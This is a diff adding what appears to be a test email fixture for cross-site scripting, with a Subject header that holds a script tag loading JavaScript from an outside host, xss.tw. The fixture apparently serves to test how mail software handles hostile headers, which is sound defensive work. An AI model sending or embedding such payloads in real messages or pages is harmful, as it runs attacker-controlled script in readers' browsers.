@@ -1,0 +1,7 @@
+From: "Owen Durham" <dwdiversifiedautom@diversifiedauto.com>
+To: Gustavo Franco <stratus@debian.org>
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
